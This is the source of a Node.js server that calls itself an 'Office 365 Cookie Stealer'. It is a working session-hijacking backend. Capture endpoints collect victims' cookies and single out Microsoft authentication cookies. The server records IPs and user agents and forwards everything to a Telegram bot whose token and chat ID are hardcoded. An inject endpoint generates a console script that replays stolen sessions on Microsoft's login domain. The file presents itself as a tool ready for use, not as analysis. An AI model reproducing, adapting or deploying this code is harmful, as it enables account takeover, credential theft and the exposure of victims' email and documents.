// =============================================
// OFFICE 365 COOKIE STEALER - COMPLETE VERSION
// =============================================

const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

// =============================================
// ⚠️ CONFIGURATION - UPDATE THESE!
// =============================================
const CONFIG = {
    botToken: '8730465777:AAHmQqHT-aPYbAtxItqtDSAtoeGhcXIv-4g',  // YOUR TOKEN
    chatId: '7075480337'                                          // YOUR CHAT ID
};

// =============================================
// MIDDLEWARE
// =============================================
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

// =============================================
// CREATE STORAGE
// =============================================
const STORAGE_DIR = './captured_sessions';
fs.ensureDirSync(STORAGE_DIR);
console.log(`✅ Storage created: ${STORAGE_DIR}/`);

// =============================================
// TELEGRAM SENDER
// =============================================
async function sendToTelegram(message, fileData = null) {
    try {
        console.log('📤 Sending to Telegram...');
        
        // Send text message
        const textResponse = await fetch(
            `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            }
        );
        
        const textResult = await textResponse.text();
        console.log('📤 Text response:', textResult.substring(0, 200));
        
        // Send file if provided
        if (fileData) {
            const FormData = require('form-data');
            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            formData.append(
                'document',
                JSON.stringify(fileData, null, 2),
                `session_${Date.now()}.json`
            );
            formData.append('caption', '📸 Captured Session Data - Office 365');
            
            const fileResponse = await fetch(
                `https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`,
                {
                    method: 'POST',
                    body: formData
                }
            );
            
            const fileResult = await fileResponse.text();
            console.log('📤 File response:', fileResult.substring(0, 200));
        }
        
        console.log('✅ Telegram sent successfully!');
        return true;
        
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// =============================================
// EXTRACT COOKIES - MULTIPLE SOURCES
// =============================================
function extractCookies(headers) {
    const cookieHeader = headers['cookie'] || headers['Cookie'] || '';
    const cookies = {};
    
    if (cookieHeader) {
        const parts = cookieHeader.split(';');
        for (const part of parts) {
            const trimmed = part.trim();
            if (trimmed) {
                const [name, ...valueParts] = trimmed.split('=');
                cookies[name] = valueParts.join('=');
            }
        }
    }
    
    return cookies;
}

// =============================================
// EXTRACT OFFICE 365 COOKIES
// =============================================
function extractOfficeCookies(cookies) {
    const officeCookies = {};
    const targetNames = [
        'ESTSAUTHPERSISTENT',
        'ESTSAUTH',
        'ESTSAUTHLIGHT',
        'SignInState',
        'SignInPolicy',
        'LoginOptions',
        'MSTeams',
        'MSA',
        'AAD',
        'Microsoft',
        'Office',
        'Outlook',
        'SharePoint',
        'x-ms-gateway-slice',
        'stsservicecookie',
        'msal',
        'clientid',
        'login_hint'
    ];
    
    for (const [name, value] of Object.entries(cookies)) {
        for (const target of targetNames) {
            if (name.includes(target) || name.toUpperCase().includes(target.toUpperCase())) {
                officeCookies[name] = value;
                break;
            }
        }
    }
    
    return officeCookies;
}

// =============================================
// POST CAPTURE ENDPOINT
// =============================================
app.post('/capture', async (req, res) => {
    console.log('\n🎯 POST COOKIE CAPTURED!');
    console.log('📥 Headers:', JSON.stringify(req.headers, null, 2).substring(0, 300));
    
    const data = req.body;
    const timestamp = new Date().toISOString();
    
    // Extract cookies from headers
    const cookies = extractCookies(req.headers);
    
    // Also check body for cookies
    if (data.cookies && typeof data.cookies === 'object') {
        for (const [key, value] of Object.entries(data.cookies)) {
            if (!cookies[key]) {
                cookies[key] = value;
            }
        }
    }
    
    const officeCookies = extractOfficeCookies(cookies);
    const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
    
    console.log(`🍪 Total cookies: ${Object.keys(cookies).length}`);
    console.log(`🎯 Office cookies: ${Object.keys(officeCookies).length}`);
    
    if (hasFullSession) {
        console.log('🔥 FULL OFFICE 365 SESSION CAPTURED!');
    }
    
    // Save to file
    const sessionData = {
        timestamp: timestamp,
        method: 'POST',
        url: data.url || req.headers.referer || 'unknown',
        userAgent: req.headers['user-agent'] || 'unknown',
        ip: req.ip || req.connection.remoteAddress,
        cookies: cookies,
        officeCookies: officeCookies,
        hasFullSession: hasFullSession,
        rawData: data
    };
    
    const filename = `session_post_${Date.now()}.json`;
    const filepath = path.join(STORAGE_DIR, filename);
    fs.writeJsonSync(filepath, sessionData, { spaces: 2 });
    console.log(`📁 Saved: ${filename}`);
    
    // =============================================
    // ALWAYS SEND TO TELEGRAM IF ANY COOKIES
    // =============================================
    if (Object.keys(cookies).length > 0) {
        console.log('📤 Sending to Telegram...');
        
        let message = '🎯 <b>POST Cookie Capture!</b>\n\n';
        message += `📅 <b>Time:</b> ${timestamp}\n`;
        message += `🌐 <b>URL:</b> ${data.url || req.headers.referer || 'Unknown'}\n`;
        message += `🖥️ <b>User-Agent:</b> ${(req.headers['user-agent'] || 'Unknown').substring(0, 80)}...\n\n`;
        message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
        message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
        
        if (hasFullSession) {
            message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
        }
        
        if (Object.keys(cookies).length > 0) {
            message += '\n📋 <b>All Cookies:</b>\n';
            let count = 0;
            for (const [name, value] of Object.entries(cookies)) {
                if (count < 20) {
                    const shortValue = value.length > 40 ? value.substring(0, 40) + '...' : value;
                    message += `• ${name}: ${shortValue}\n`;
                    count++;
                } else {
                    message += `• ... and ${Object.keys(cookies).length - 20} more\n`;
                    break;
                }
            }
        }
        
        await sendToTelegram(message, sessionData);
        
    } else {
        console.log('❌ No cookies found. Nothing sent to Telegram.');
    }
    
    res.json({
        success: true,
        captured: Object.keys(cookies).length,
        officeCookies: Object.keys(officeCookies).length,
        hasFullSession: hasFullSession
    });
});

// =============================================
// GET CAPTURE ENDPOINT - FALLBACK
// =============================================
app.get('/capture', async (req, res) => {
    console.log('\n🎯 GET CAPTURE RECEIVED!');
    console.log('📥 Query:', req.query);
    
    let cookies = {};
    let data = {};
    
    // Try to parse data from query
    if (req.query.data) {
        try {
            data = JSON.parse(decodeURIComponent(req.query.data));
            if (data.cookies) {
                cookies = data.cookies;
            }
        } catch (e) {}
    }
    
    if (req.query.cookies) {
        try {
            const parsedCookies = JSON.parse(decodeURIComponent(req.query.cookies));
            for (const [key, value] of Object.entries(parsedCookies)) {
                if (!cookies[key]) {
                    cookies[key] = value;
                }
            }
        } catch (e) {}
    }
    
    // Also check headers
    const headerCookies = extractCookies(req.headers);
    for (const [key, value] of Object.entries(headerCookies)) {
        if (!cookies[key]) {
            cookies[key] = value;
        }
    }
    
    console.log(`🍪 GET Captured ${Object.keys(cookies).length} cookies`);
    
    // Process if we have cookies
    if (Object.keys(cookies).length > 0) {
        const officeCookies = extractOfficeCookies(cookies);
        const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
        
        const sessionData = {
            timestamp: new Date().toISOString(),
            method: 'GET',
            url: data.url || req.headers.referer || 'GET fallback',
            userAgent: req.headers['user-agent'] || 'unknown',
            ip: req.ip || req.connection.remoteAddress,
            cookies: cookies,
            officeCookies: officeCookies,
            hasFullSession: hasFullSession,
            query: req.query
        };
        
        // Save to file
        const filename = `session_get_${Date.now()}.json`;
        fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
        
        // Send to Telegram
        let message = '🎯 <b>GET Capture!</b>\n\n';
        message += `📅 <b>Time:</b> ${new Date().toISOString()}\n`;
        message += `🍪 <b>Cookies:</b> ${Object.keys(cookies).length}\n`;
        message += `🎯 <b>Office:</b> ${Object.keys(officeCookies).length}\n`;
        
        if (hasFullSession) {
            message += '\n🔥 <b>FULL SESSION CAPTURED!</b>\n';
        }
        
        await sendToTelegram(message, sessionData);
        
        res.json({ success: true, captured: Object.keys(cookies).length });
    } else {
        console.log('❌ No cookies found in GET request');
        res.json({ success: false, message: 'No cookies found' });
    }
});

// =============================================
// VIEW SESSIONS
// =============================================
app.get('/sessions', (req, res) => {
    const files = fs.readdirSync(STORAGE_DIR);
    const sessions = [];
    
    for (const file of files) {
        try {
            const data = fs.readJsonSync(path.join(STORAGE_DIR, file));
            sessions.push({
                file: file,
                timestamp: data.timestamp,
                url: data.url,
                cookieCount: Object.keys(data.cookies || {}).length,
                officeCount: Object.keys(data.officeCookies || {}).length,
                hasFullSession: data.hasFullSession || false
            });
        } catch (e) {}
    }
    
    res.json(sessions);
});

// =============================================
// INJECT COOKIES
// =============================================
app.post('/inject', (req, res) => {
    const { cookies } = req.body;
    
    if (!cookies || Object.keys(cookies).length === 0) {
        return res.status(400).json({ error: 'No cookies provided' });
    }
    
    const jsScript = `
// =============================================
// PASTE THIS IN BROWSER CONSOLE
// =============================================

const cookies = ${JSON.stringify(cookies, null, 2)};

for (const [name, value] of Object.entries(cookies)) {
    document.cookie = name + '=' + value + '; path=/; domain=.login.microsoftonline.com; Secure; SameSite=None';
}

console.log('✅ ' + Object.keys(cookies).length + ' cookies injected!');
console.log('🔄 Go to login.microsoftonline.com and refresh.');
    `;
    
    res.json({
        success: true,
        count: Object.keys(cookies).length,
        injectionScript: jsScript
    });
});

// =============================================
// SERVE DASHBOARD
// =============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/injector.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'injector.html'));
});

// =============================================
// START SERVER
// =============================================
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🔥 OFFICE 365 COOKIE STEALER                             ║
║   🎯 Running on Railway!                                   ║
║                                                              ║
║   📡 Port: ${PORT}                                           ║
║   📁 Captures: ${STORAGE_DIR}/                              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    `);
});
